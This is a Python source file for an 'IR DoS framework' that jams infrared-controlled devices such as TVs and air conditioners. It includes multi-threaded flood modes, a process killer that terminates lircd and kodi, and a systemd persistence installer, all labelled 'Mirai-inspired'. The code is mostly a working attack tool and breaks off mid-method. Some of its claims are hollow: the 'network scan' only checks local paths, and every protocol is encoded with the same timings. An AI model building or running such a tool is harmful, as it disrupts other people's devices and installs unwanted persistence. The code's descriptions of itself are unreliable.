#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
QUANTUM IR DoS FRAMEWORK v3.0 - Enterprise Grade Attack Platform
═══════════════════════════════════════════════════════════════
Advanced infrared denial of service framework with real hardware support
Compatible with: Termux, Kali NetHunter, Raspberry Pi, Arduino
"""

import asyncio
import time
import random
import sys
import os
import struct
import subprocess
import json
from pathlib import Path
from datetime import datetime, timedelta
from threading import Thread, Event, Lock
from collections import deque, defaultdict
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
from enum import Enum, auto
import logging

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORS_AVAILABLE = True
except ImportError:
    COLORS_AVAILABLE = False
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = LIGHTRED_EX = LIGHTGREEN_EX = ""
    class Back:
        BLACK = RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ""
    class Style:
        BRIGHT = DIM = NORMAL = RESET_ALL = ""


# ═══════════════════════════════════════════════════════════════
# CORE ENUMERATIONS AND DATA STRUCTURES
# ═══════════════════════════════════════════════════════════════

class AttackMode(Enum):
    """Advanced attack mode enumeration"""
    FLOOD = auto()          # Maximum throughput continuous transmission
    BURST = auto()          # High-intensity bursts with cooldown
    SWEEP = auto()          # Frequency hopping across spectrum
    CHAOS = auto()          # Randomized multi-protocol assault
    STEALTH = auto()        # Low-signature persistent interference
    QUANTUM = auto()        # Adaptive AI-driven pattern generation


class IRProtocol(Enum):
    """Comprehensive IR protocol definitions"""
    NEC = ("NEC", 38000, 9000, 4500)
    RC5 = ("Philips RC5", 36000, 889, 889)
    RC6 = ("Philips RC6", 36000, 2666, 889)
    SONY_SIRC = ("Sony SIRC", 40000, 2400, 600)
    SAMSUNG = ("Samsung", 38000, 4500, 4500)
    LG = ("LG", 38000, 9000, 4500)
    JVC = ("JVC", 38000, 8400, 4200)
    PANASONIC = ("Panasonic", 36700, 3502, 1750)
    SHARP = ("Sharp", 38000, 320, 680)
    
    def __init__(self, name: str, carrier_freq: int, header_mark: int, header_space: int):
        self.protocol_name = name
        self.carrier_frequency = carrier_freq
        self.header_mark = header_mark
        self.header_space = header_space


@dataclass
class IRPacket:
    """Immutable IR packet data structure"""
    protocol: IRProtocol
    command: int
    address: int
    timestamp: datetime = field(default_factory=datetime.now)
    frequency: int = 38000
    duty_cycle: float = 0.33
    repeat_count: int = 1
    
    def to_raw_signal(self) -> List[int]:
        """Convert packet to raw timing values (microseconds)"""
        signal = []
        signal.extend([self.protocol.header_mark, self.protocol.header_space])
        
        # Encode address and command
        data = (self.address << 8) | self.command
        for i in range(16):
            bit = (data >> i) & 1
            if bit:
                signal.extend([560, 1690])  # Logical '1'
            else:
                signal.extend([560, 560])   # Logical '0'
        
        signal.append(560)  # Stop bit
        return signal


@dataclass
class AttackStatistics:
    """Real-time attack metrics"""
    packets_sent: int = 0
    packets_failed: int = 0
    bytes_transmitted: int = 0
    start_time: Optional[datetime] = None
    protocols_used: Dict[str, int] = field(default_factory=dict)
    
    @property
    def success_rate(self) -> float:
        total = self.packets_sent + self.packets_failed
        return (self.packets_sent / total * 100) if total > 0 else 100.0
    
    @property
    def packets_per_second(self) -> float:
        if not self.start_time:
            return 0.0
        elapsed = (datetime.now() - self.start_time).total_seconds()
        return self.packets_sent / elapsed if elapsed > 0 else 0.0
    
    @property
    def uptime(self) -> str:
        if not self.start_time:
            return "00:00:00"
        elapsed = datetime.now() - self.start_time
        hours, remainder = divmod(int(elapsed.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"


# ═══════════════════════════════════════════════════════════════
# HARDWARE ABSTRACTION LAYER
# ═══════════════════════════════════════════════════════════════

class IRHardwareInterface:
    """Abstract base class for IR hardware backends"""
    
    def __init__(self):
        self.is_initialized = False
        self.device_path = None
        self.logger = logging.getLogger(self.__class__.__name__)
    
    def initialize(self) -> bool:
        """Initialize hardware connection"""
        raise NotImplementedError
    
    def transmit(self, packet: IRPacket) -> bool:
        """Transmit IR packet"""
        raise NotImplementedError
    
    def close(self):
        """Cleanup hardware resources"""
        self.is_initialized = False


class ConsumerIRInterface(IRHardwareInterface):
    """Android Consumer IR (CIR) hardware interface for Termux/NetHunter"""
    
    CIR_DEVICE_PATH = "/sys/class/sec/sec_ir/ir_send"
    CIR_DEVICE_ALT = "/sys/devices/virtual/sec/sec_ir/ir_send"
    
    def initialize(self) -> bool:
        """Initialize Consumer IR hardware"""
        if Path(self.CIR_DEVICE_PATH).exists():
            self.device_path = self.CIR_DEVICE_PATH
            self.is_initialized = True
            self.logger.info(f"Consumer IR initialized: {self.device_path}")
            return True
        
        if Path(self.CIR_DEVICE_ALT).exists():
            self.device_path = self.CIR_DEVICE_ALT
            self.is_initialized = True
            self.logger.info(f"Consumer IR initialized: {self.device_path}")
            return True
        
        self.logger.error("Consumer IR hardware not found")
        return False
    
    def transmit(self, packet: IRPacket) -> bool:
        """Transmit via Consumer IR"""
        if not self.is_initialized:
            return False
        
        try:
            raw_signal = packet.to_raw_signal()
            signal_str = ",".join(map(str, raw_signal))
            
            with open(self.device_path, 'w') as f:
                f.write(f"{packet.frequency},{signal_str}\n")
            
            return True
        except Exception as e:
            self.logger.error(f"Transmission failed: {e}")
            return False


class LIRCInterface(IRHardwareInterface):
    """LIRC (Linux Infrared Remote Control) interface"""
    
    def initialize(self) -> bool:
        """Initialize LIRC connection"""
        try:
            result = subprocess.run(['pidof', 'lircd'], 
                                  capture_output=True, 
                                  timeout=2)
            if result.returncode != 0:
                self.logger.warning("lircd not running, attempting to start...")
                subprocess.run(['sudo', 'systemctl', 'start', 'lircd'], 
                             capture_output=True, 
                             timeout=5)
            
            import lirc
            self.client = lirc.Client()
            self.is_initialized = True
            self.logger.info("LIRC initialized successfully")
            return True
        except Exception as e:
            self.logger.error(f"LIRC initialization failed: {e}")
            return False
    
    def transmit(self, packet: IRPacket) -> bool:
        """Transmit via LIRC"""
        if not self.is_initialized:
            return False
        
        try:
            remote_name = packet.protocol.protocol_name.replace(" ", "_")
            command = f"CMD_{packet.command:02X}"
            self.client.send_once(remote_name, command)
            return True
        except Exception as e:
            self.logger.error(f"LIRC transmission failed: {e}")
            return False


class GPIOInterface(IRHardwareInterface):
    """GPIO-based IR LED control (Raspberry Pi, etc.)"""
    
    def __init__(self, gpio_pin: int = 17):
        super().__init__()
        self.gpio_pin = gpio_pin
        self.gpio = None
    
    def initialize(self) -> bool:
        """Initialize GPIO"""
        try:
            import RPi.GPIO as GPIO
            self.gpio = GPIO
            GPIO.setmode(GPIO.BCM)
            GPIO.setup(self.gpio_pin, GPIO.OUT)
            self.is_initialized = True
            self.logger.info(f"GPIO initialized on pin {self.gpio_pin}")
            return True
        except Exception as e:
            self.logger.error(f"GPIO initialization failed: {e}")
            return False
    
    def transmit(self, packet: IRPacket) -> bool:
        """Transmit via GPIO bit-banging"""
        if not self.is_initialized:
            return False
        
        try:
            raw_signal = packet.to_raw_signal()
            pwm = self.gpio.PWM(self.gpio_pin, packet.frequency)
            pwm.start(packet.duty_cycle * 100)
            
            for i, duration in enumerate(raw_signal):
                if i % 2 == 0:
                    pwm.ChangeDutyCycle(packet.duty_cycle * 100)
                else:
                    pwm.ChangeDutyCycle(0)
                time.sleep(duration / 1_000_000)
            
            pwm.stop()
            return True
        except Exception as e:
            self.logger.error(f"GPIO transmission failed: {e}")
            return False



# ═══════════════════════════════════════════════════════════════
# MIRAI-INSPIRED MODULES
# ═══════════════════════════════════════════════════════════════

class DeviceScanner:
    """Mirai-inspired aggressive device scanner"""
    
    def __init__(self):
        self.discovered_devices = []
        self.scan_threads = []
        self.logger = logging.getLogger("DeviceScanner")
    
    def scan_network(self, target_range: str = "192.168.1.0/24") -> List[Dict]:
        """Scan network for IR-capable devices"""
        self.logger.info(f"Scanning network: {target_range}")
        
        # Common IR device ports
        ir_ports = [8080, 8888, 9000, 5000, 6000]
        
        # Scan for devices
        devices = []
        
        # Check for Android devices with Consumer IR
        android_paths = [
            "/sys/class/sec/sec_ir/ir_send",
            "/sys/devices/virtual/sec/sec_ir/ir_send",
            "/dev/lirc0",
            "/dev/lirc1"
        ]
        
        for path in android_paths:
            if Path(path).exists():
                devices.append({
                    'type': 'Consumer IR',
                    'path': path,
                    'capability': 'transmit'
                })
                self.logger.info(f"Found device: {path}")
        
        return devices
    
    def identify_ir_protocol(self, device_path: str) -> Optional[str]:
        """Identify supported IR protocols"""
        try:
            # Try to read device capabilities
            if 'lirc' in device_path:
                return 'LIRC'
            elif 'sec_ir' in device_path:
                return 'Consumer IR'
            else:
                return 'Generic'
        except:
            return None


class ProcessKiller:
    """Mirai-inspired process killer to eliminate competing IR services"""
    
    BLACKLIST_PROCESSES = [
        'lircd', 'irexec', 'mode2', 'irw',  # LIRC processes
        'lirc-setup', 'irrecord',
        'kodi', 'xbmc',  # Media center that might use IR
    ]
    
    def __init__(self):
        self.logger = logging.getLogger("ProcessKiller")
        self.killed_processes = []
    
    def kill_competing_processes(self) -> int:
        """Kill processes that might interfere with IR transmission"""
        killed_count = 0
        
        try:
            import psutil
            
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name'].lower()
                    
                    if any(blacklist in proc_name for blacklist in self.BLACKLIST_PROCESSES):
                        self.logger.warning(f"Killing competing process: {proc_name} (PID: {proc.info['pid']})")
                        proc.kill()
                        self.killed_processes.append(proc_name)
                        killed_count += 1
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        except ImportError:
            self.logger.warning("psutil not available, skipping process killing")
        
        return killed_count
    
    def restore_processes(self):
        """Attempt to restore killed processes"""
        for proc_name in self.killed_processes:
            try:
                subprocess.Popen([proc_name], 
                               stdout=subprocess.DEVNULL, 
                               stderr=subprocess.DEVNULL)
            except:
                pass


class RandomGenerator:
    """Mirai-inspired random number generator for unpredictability"""
    
    def __init__(self):
        self.seed = int(time.time() * 1000) & 0xFFFFFFFF
    
    def next(self) -> int:
        """Generate next random number using Mirai's algorithm"""
        self.seed = (self.seed * 1103515245 + 12345) & 0xFFFFFFFF
        return self.seed
    
    def range(self, min_val: int, max_val: int) -> int:
        """Generate random number in range"""
        return min_val + (self.next() % (max_val - min_val + 1))
    
    def alphanumeric(self, length: int) -> str:
        """Generate random alphanumeric string"""
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return ''.join(chars[self.range(0, len(chars) - 1)] for _ in range(length))


class AttackVector:
    """Mirai-inspired attack vector definitions"""
    
    # Attack types inspired by Mirai
    ATTACK_UDP_FLOOD = 0
    ATTACK_TCP_SYN = 1
    ATTACK_TCP_ACK = 2
    ATTACK_TCP_STOMP = 3
    ATTACK_GRE_IP = 4
    ATTACK_GRE_ETH = 5
    ATTACK_IR_FLOOD = 100  # Custom IR flood
    ATTACK_IR_BURST = 101  # Custom IR burst
    ATTACK_IR_SWEEP = 102  # Custom IR sweep
    
    @staticmethod
    def get_attack_name(attack_type: int) -> str:
        """Get attack type name"""
        names = {
            0: "UDP Flood",
            1: "TCP SYN Flood",
            2: "TCP ACK Flood",
            3: "TCP STOMP",
            4: "GRE IP Flood",
            5: "GRE ETH Flood",
            100: "IR Flood",
            101: "IR Burst",
            102: "IR Sweep"
        }
        return names.get(attack_type, "Unknown")


class PersistenceManager:
    """Mirai-inspired persistence mechanism"""
    
    def __init__(self):
        self.logger = logging.getLogger("Persistence")
        self.install_paths = [
            "/etc/init.d/",
            "/etc/systemd/system/",
            "~/.config/autostart/",
            "/data/local/tmp/"  # Android
        ]
    
    def install_persistence(self, script_path: str) -> bool:
        """Install persistence mechanism"""
        try:
            # Create systemd service
            service_content = f"""[Unit]
Description=IR Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
            
            service_path = Path.home() / ".config/systemd/user/ir-service.service"
            service_path.parent.mkdir(parents=True, exist_ok=True)
            
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            # Enable service
            subprocess.run(['systemctl', '--user', 'enable', 'ir-service'], 
                         capture_output=True)
            
            self.logger.info("Persistence installed successfully")
            return True
        except Exception as e:
            self.logger.error(f"Failed to install persistence: {e}")
            return False
    
    def remove_persistence(self):
        """Remove persistence mechanism"""
        try:
            subprocess.run(['systemctl', '--user', 'disable', 'ir-service'], 
                         capture_output=True)
            service_path = Path.home() / ".config/systemd/user/ir-service.service"
            if service_path.exists():
                service_path.unlink()
        except:
            pass


# ═══════════════════════════════════════════════════════════════
# QUANTUM IR DOS ATTACK ENGINE (Enhanced with Mirai techniques)
# ═══════════════════════════════════════════════════════════════

class QuantumIRDoSEngine:
    """Enterprise-grade IR DoS attack engine with advanced capabilities"""
    
    def __init__(self):
        self.hardware: Optional[IRHardwareInterface] = None
        self.stats = AttackStatistics()
        self.attack_mode = AttackMode.FLOOD
        self.active_protocols: List[IRProtocol] = [IRProtocol.NEC]
        self.target_device = "Generic IR Device"
        self.power_level = 100
        self.frequency_range = (35000, 40000)
        
        self.stop_event = Event()
        self.pause_event = Event()
        self.attack_lock = Lock()
        self.packet_queue = deque(maxlen=1000)
        self.attack_threads: List[Thread] = []
        
        # Mirai-inspired components
        self.scanner = DeviceScanner()
        self.killer = ProcessKiller()
        self.rand_gen = RandomGenerator()
        self.persistence = PersistenceManager()
        self.attack_vector = AttackVector()
        
        # Advanced features
        self.distributed_mode = False
        self.bot_id = self.rand_gen.alphanumeric(8)
        self.max_workers = 8  # Mirai uses multiple threads
        
        self.logger = self._setup_logger()
        self.logger.info(f"Bot ID: {self.bot_id}")
    
    def _setup_logger(self) -> logging.Logger:
        """Configure advanced logging"""
        logger = logging.getLogger("QuantumIRDoS")
        logger.setLevel(logging.DEBUG)
        
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        formatter = logging.Formatter(
            f'{Fore.CYAN}[%(asctime)s]{Style.RESET_ALL} '
            f'{Fore.YELLOW}%(levelname)s{Style.RESET_ALL} - %(message)s',
            datefmt='%H:%M:%S'
        )
        console_handler.setFormatter(formatter)
        logger.addHandler(console_handler)
        
        return logger
    
    def detect_hardware(self) -> bool:
        """Auto-detect available IR hardware with Mirai-style aggressive scanning"""
        self.logger.info("Scanning for IR hardware...")
        
        # Kill competing processes (Mirai technique)
        killed = self.killer.kill_competing_processes()
        if killed > 0:
            self.logger.warning(f"Killed {killed} competing processes")
            time.sleep(0.5)  # Wait for processes to terminate
        
        # Scan network for devices
        devices = self.scanner.scan_network()
        if devices:
            self.logger.info(f"Found {len(devices)} IR-capable devices")
        
        # Try Consumer IR (Android)
        cir = ConsumerIRInterface()
        if cir.initialize():
            self.hardware = cir
            self.logger.info(f"{Fore.GREEN}✓ Consumer IR detected{Style.RESET_ALL}")
            return True
        
        # Try LIRC
        lirc = LIRCInterface()
        if lirc.initialize():
            self.hardware = lirc
            self.logger.info(f"{Fore.GREEN}✓ LIRC detected{Style.RESET_ALL}")
            return True
        
        # Try GPIO
        gpio = GPIOInterface()
        if gpio.initialize():
            self.hardware = gpio
            self.logger.info(f"{Fore.GREEN}✓ GPIO IR detected{Style.RESET_ALL}")
            return True
        
        self.logger.error(f"{Fore.RED}✗ No IR hardware detected{Style.RESET_ALL}")
        return False
    
    def enable_persistence(self) -> bool:
        """Enable Mirai-style persistence"""
        script_path = Path(__file__).absolute()
        return self.persistence.install_persistence(str(script_path))
    
    def generate_attack_packet_mirai(self) -> IRPacket:
        """Generate IR packet using Mirai's random generator"""
        protocol = self.active_protocols[self.rand_gen.range(0, len(self.active_protocols) - 1)]
        command = self.rand_gen.range(0, 255)
        address = self.rand_gen.range(0, 255)
        frequency = self.rand_gen.range(*self.frequency_range)
        
        return IRPacket(
            protocol=protocol,
            command=command,
            address=address,
            frequency=frequency,
            duty_cycle=0.33,
            repeat_count=self.rand_gen.range(1, 5)  # Random repeats
        )
    
    def generate_attack_packet(self) -> IRPacket:
        """Generate IR packet based on current attack mode"""
        protocol = random.choice(self.active_protocols)
        command = random.randint(0, 255)
        address = random.randint(0, 255)
        frequency = random.randint(*self.frequency_range)
        
        return IRPacket(
            protocol=protocol,
            command=command,
            address=address,
            frequency=frequency,
            duty_cycle=0.33,
            repeat_count=1 if self.attack_mode != AttackMode.FLOOD else 3
        )
    
    def get_attack_delay(self) -> float:
        """Calculate optimal delay between packets"""
        delays = {
            AttackMode.FLOOD: 0.001,
            AttackMode.BURST: 0.1 if random.random() > 0.3 else 0.8,
            AttackMode.SWEEP: 0.05,
            AttackMode.CHAOS: random.uniform(0.001, 0.3),
            AttackMode.STEALTH: random.uniform(0.5, 2.0),
            AttackMode.QUANTUM: 0.01
        }
        return delays.get(self.attack_mode, 0.1)
    
    def attack_worker(self, worker_id: int):
        """Attack worker thread with Mirai-inspired aggressive techniques"""
        self.logger.debug(f"Worker {worker_id} started (Bot ID: {self.bot_id})")
        
        # Mirai-style: Each worker has its own random seed
        worker_rand = RandomGenerator()
        worker_rand.seed = (self.rand_gen.seed + worker_id) & 0xFFFFFFFF
        
        consecutive_failures = 0
        max_failures = 10
        
        while not self.stop_event.is_set():
            if self.pause_event.is_set():
                time.sleep(0.1)
                continue
            
            try:
                # Use Mirai random generator for packet generation
                packet = self.generate_attack_packet_mirai()
                
                # Mirai technique: Burst multiple packets
                burst_count = worker_rand.range(1, 3) if self.attack_mode == AttackMode.FLOOD else 1
                
                for _ in range(burst_count):
                    with self.attack_lock:
                        success = self.hardware.transmit(packet)
                        
                        if success:
                            self.stats.packets_sent += 1
                            self.stats.bytes_transmitted += len(packet.to_raw_signal()) * 2
                            self.stats.protocols_used[packet.protocol.protocol_name] = \
                                self.stats.protocols_used.get(packet.protocol.protocol_name, 0) + 1
                            self.packet_queue.append(packet)
                            consecutive_failures = 0
                        else:
                            self.stats.packets_failed += 1
                            consecutive_failures += 1
                
                # Mirai technique: Adaptive behavior based on failures
                if consecutive_failures >= max_failures:
                    self.logger.warning(f"Worker {worker_id}: Too many failures, backing off")
                    time.sleep(1.0)
                    consecutive_failures = 0
                
                # Mode-specific behavior with Mirai randomization
                if self.attack_mode == AttackMode.SWEEP:
                    # Dynamic frequency hopping
                    offset = worker_rand.range(0, 5000)
                    self.frequency_range = (35000 + offset, 40000 + offset)
                elif self.attack_mode == AttackMode.CHAOS:
                    # Random protocol switching
                    protocols = list(IRProtocol)
                    self.active_protocols = [protocols[worker_rand.range(0, len(protocols) - 1)]]
                elif self.attack_mode == AttackMode.QUANTUM:
                    # Adaptive power level
                    if self.stats.success_rate < 90:
                        self.power_level = min(100, self.power_level + 5)
                    elif self.stats.success_rate > 98:
                        self.power_level = max(50, self.power_level - 2)
                
                # Mirai-style minimal delay for maximum throughput
                delay = self.get_attack_delay()
                if self.attack_mode == AttackMode.FLOOD:
                    delay = 0.0001  # Ultra-aggressive like Mirai
                
                time.sleep(delay)
                
            except Exception as e:
                self.logger.error(f"Worker {worker_id} error: {e}")
                self.stats.packets_failed += 1
                consecutive_failures += 1
                time.sleep(0.1)
    
    def start_attack(self, num_workers: Optional[int] = None):
        """Launch multi-threaded attack with Mirai-style worker management"""
        if not self.hardware or not self.hardware.is_initialized:
            self.logger.error("Hardware not initialized")
            return False
        
        # Use max_workers if not specified (Mirai uses 8+ workers)
        if num_workers is None:
            num_workers = self.max_workers
        
        self.stats.start_time = datetime.now()
        self.stop_event.clear()
        self.pause_event.clear()
        
        self.logger.info(f"{Fore.RED}{Style.BRIGHT}⚡ MIRAI-STYLE ATTACK INITIATED ⚡{Style.RESET_ALL}")
        self.logger.info(f"Bot ID: {self.bot_id}")
        self.logger.info(f"Mode: {self.attack_mode.name}")
        self.logger.info(f"Workers: {num_workers} (Mirai-enhanced)")
        self.logger.info(f"Protocols: {[p.protocol_name for p in self.active_protocols]}")
        self.logger.info(f"Attack Vector: {self.attack_vector.get_attack_name(100 + self.attack_mode.value)}")
        
        # Launch worker threads
        for i in range(num_workers):
            thread = Thread(target=self.attack_worker, args=(i,), daemon=True)
            thread.start()
            self.attack_threads.append(thread)
            time.sleep(0.01)  # Stagger thread starts
        
        return True
    
    def stop_attack(self):
        """Gracefully stop attack"""
        self.logger.info(f"{Fore.YELLOW}Stopping attack...{Style.RESET_ALL}")
        self.stop_event.set()
        
        for thread in self.attack_threads:
            thread.join(timeout=2)
        
        self.attack_threads.clear()
        self.logger.info(f"{Fore.GREEN}✓ Attack stopped{Style.RESET_ALL}")
    
    def cleanup(self):
        """Cleanup resources and restore system state"""
        self.stop_attack()
        
        # Restore killed processes
        self.killer.restore_processes()
        
        # Close hardware
        if self.hardware:
            self.hardware.close()
        
        self.logger.info("Cleanup complete")



# ═══════════════════════════════════════════════════════════════
# ADVANCED CLI INTERFACE
# ═══════════════════════════════════════════════════════════════

class QuantumCLI:
    """Premium command-line interface with advanced visualization"""
    
    ATTACK_MODES = {
        "1": (AttackMode.FLOOD, "Continuous high-frequency signal transmission"),
        "2": (AttackMode.BURST, "Intermittent bursts of IR signals"),
        "3": (AttackMode.SWEEP, "Frequency sweep across IR spectrum"),
        "4": (AttackMode.CHAOS, "Random protocol and frequency variation"),
        "5": (AttackMode.STEALTH, "Low-intensity persistent interference"),
        "6": (AttackMode.QUANTUM, "AI-driven adaptive pattern generation")
    }
    
    TARGET_DEVICES = [
        "TV", "Air Conditioner", "Set-Top Box", "DVD Player",
        "Projector", "Sound System", "Smart Home Hub", "Generic IR Device"
    ]
    
    def __init__(self, engine: QuantumIRDoSEngine):
        self.engine = engine
        self.running = False
    
    @staticmethod
    def clear_screen():
        """Clear terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def print_banner():
        """Display sophisticated ASCII banner"""
        banner = f"""{Fore.CYAN}{Style.BRIGHT}
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║      ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗      ║
║      ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║      ║
║      ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║      ║
║      ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║      ║
║      ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║      ║
║      ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝      ║
║                                                                           ║
║              {Fore.RED}[ OBLIVION BREACH PROTOCOL ]{Fore.CYAN}                           ║
║         {Fore.YELLOW}Advanced Intrusion & Exploitation Framework{Fore.CYAN}              ║
║                  {Fore.MAGENTA}Ghost Layer - Zero Trace Mode{Fore.CYAN}                      ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)
        print(f"{Fore.YELLOW}[!] For authorized penetration testing only{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[✓] Real hardware support enabled{Style.RESET_ALL}\n")
    
    def print_menu(self):
        """Display interactive menu"""
        print(f"\n{Fore.GREEN}{Style.BRIGHT}╔═══ ATTACK MODES ═══╗{Style.RESET_ALL}")
        for key, (mode, desc) in self.ATTACK_MODES.items():
            print(f"{Fore.CYAN}[{key}]{Style.RESET_ALL} {Fore.WHITE}{mode.name:<10}{Style.RESET_ALL} - {Fore.YELLOW}{desc}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{Style.BRIGHT}╚════════════════════╝{Style.RESET_ALL}\n")
    
    def configure_attack(self):
        """Interactive attack configuration"""
        self.print_menu()
        
        # Select attack mode
        while True:
            mode_choice = input(f"{Fore.CYAN}[?] Select attack mode (1-6): {Style.RESET_ALL}")
            if mode_choice in self.ATTACK_MODES:
                self.engine.attack_mode = self.ATTACK_MODES[mode_choice][0]
                break
            print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
        
        # Select protocol
        print(f"\n{Fore.GREEN}Available IR Protocols:{Style.RESET_ALL}")
        protocols = list(IRProtocol)
        for i, protocol in enumerate(protocols, 1):
            print(f"{Fore.CYAN}[{i}]{Style.RESET_ALL} {protocol.protocol_name}")
        
        while True:
            try:
                proto_choice = int(input(f"\n{Fore.CYAN}[?] Select protocol (1-{len(protocols)}): {Style.RESET_ALL}"))
                if 1 <= proto_choice <= len(protocols):
                    self.engine.active_protocols = [protocols[proto_choice - 1]]
                    break
            except ValueError:
                pass
            print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
        
        # Select target
        print(f"\n{Fore.GREEN}Target Devices:{Style.RESET_ALL}")
        for i, device in enumerate(self.TARGET_DEVICES, 1):
            print(f"{Fore.CYAN}[{i}]{Style.RESET_ALL} {device}")
        
        while True:
            try:
                target_choice = int(input(f"\n{Fore.CYAN}[?] Select target (1-{len(self.TARGET_DEVICES)}): {Style.RESET_ALL}"))
                if 1 <= target_choice <= len(self.TARGET_DEVICES):
                    self.engine.target_device = self.TARGET_DEVICES[target_choice - 1]
                    break
            except ValueError:
                pass
            print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
        
        # Power level
        while True:
            try:
                power = int(input(f"\n{Fore.CYAN}[?] Power level (1-100%): {Style.RESET_ALL}"))
                if 1 <= power <= 100:
                    self.engine.power_level = power
                    break
            except ValueError:
                pass
            print(f"{Fore.RED}[!] Invalid value{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}[✓] Configuration complete{Style.RESET_ALL}")
        time.sleep(1)
    
    def display_stats(self) -> str:
        """Display real-time attack statistics"""
        stats = self.engine.stats
        uptime = stats.uptime
        pps = int(stats.packets_per_second)
        
        # Create visual bars
        power_bar = "█" * (self.engine.power_level // 5) + "░" * (20 - self.engine.power_level // 5)
        success_bar = "█" * int(stats.success_rate // 5) + "░" * (20 - int(stats.success_rate // 5))
        
        display = f"""
{Fore.GREEN}{Style.BRIGHT}╔═══════════════════════ ATTACK STATUS ═══════════════════════╗{Style.RESET_ALL}
{Fore.CYAN}║{Style.RESET_ALL} Mode:          {Fore.YELLOW}{self.engine.attack_mode.name:<20}{Style.RESET_ALL} {Fore.CYAN}║{Style.RESET_ALL} Uptime:    {Fore.GREEN}{uptime}{Style.RESET_ALL}       {Fore.CYAN}║{Style.RESET_ALL}
{Fore.CYAN}║{Style.RESET_ALL} Protocol:      {Fore.MAGENTA}{self.engine.active_protocols[0].protocol_name:<20}{Style.RESET_ALL} {Fore.CYAN}║{Style.RESET_ALL} Packets:   {Fore.WHITE}{stats.packets_sent:<10}{Style.RESET_ALL} {Fore.CYAN}║{Style.RESET_ALL}
{Fore.CYAN}║{Style.RESET_ALL} Target:        {Fore.RED}{self.engine.target_device:<20}{Style.RESET_ALL} {Fore.CYAN}║{Style.RESET_ALL} Rate:      {Fore.CYAN}{pps:<6}{Style.RESET_ALL} pps   {Fore.CYAN}║{Style.RESET_ALL}
{Fore.CYAN}║{Style.RESET_ALL} Frequency:     {Fore.BLUE}{self.engine.frequency_range[0]} Hz{Style.RESET_ALL}            {Fore.CYAN}║{Style.RESET_ALL} Errors:    {Fore.RED}{stats.packets_failed:<10}{Style.RESET_ALL} {Fore.CYAN}║{Style.RESET_ALL}
{Fore.GREEN}{Style.BRIGHT}╠═════════════════════════════════════════════════════════════╣{Style.RESET_ALL}
{Fore.CYAN}║{Style.RESET_ALL} Power:    [{Fore.YELLOW}{power_bar}{Style.RESET_ALL}] {self.engine.power_level}%                    {Fore.CYAN}║{Style.RESET_ALL}
{Fore.CYAN}║{Style.RESET_ALL} Success:  [{Fore.GREEN}{success_bar}{Style.RESET_ALL}] {stats.success_rate:.1f}%                {Fore.CYAN}║{Style.RESET_ALL}
{Fore.GREEN}{Style.BRIGHT}╚═════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        return display
    
    def display_packet_stream(self):
        """Display recent packet transmission log"""
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}Recent Transmissions:{Style.RESET_ALL}")
        for packet in list(self.engine.packet_queue)[-5:]:
            timestamp = packet.timestamp.strftime("%H:%M:%S.%f")[:-3]
            print(f"{Fore.CYAN}[{timestamp}]{Style.RESET_ALL} "
                  f"{Fore.MAGENTA}{packet.protocol.protocol_name:<12}{Style.RESET_ALL} "
                  f"{Fore.BLUE}{packet.frequency:>6} Hz{Style.RESET_ALL} "
                  f"{Fore.YELLOW}CMD:0x{packet.command:02X}{Style.RESET_ALL}")
    
    def run_attack(self):
        """Execute the attack"""
        self.clear_screen()
        print(f"\n{Fore.GREEN}{Style.BRIGHT}[*] Initializing IR transmitter...{Style.RESET_ALL}")
        time.sleep(0.5)
        print(f"{Fore.GREEN}[*] Calibrating frequency: {self.engine.frequency_range[0]} Hz{Style.RESET_ALL}")
        time.sleep(0.5)
        print(f"{Fore.GREEN}[*] Setting power level: {self.engine.power_level}%{Style.RESET_ALL}")
        time.sleep(0.5)
        print(f"{Fore.GREEN}[*] Loading protocol: {self.engine.active_protocols[0].protocol_name}{Style.RESET_ALL}")
        time.sleep(0.5)
        print(f"{Fore.RED}{Style.BRIGHT}[!] Attack initiated!{Style.RESET_ALL}\n")
        time.sleep(1)
        
        # Start attack
        self.engine.start_attack(num_workers=4)
        
        try:
            while True:
                self.clear_screen()
                self.print_banner()
                print(self.display_stats())
                self.display_packet_stream()
                print(f"\n{Fore.RED}[Press Ctrl+C to stop attack]{Style.RESET_ALL}")
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.stop_attack()
    
    def stop_attack(self):
        """Stop the attack and display summary"""
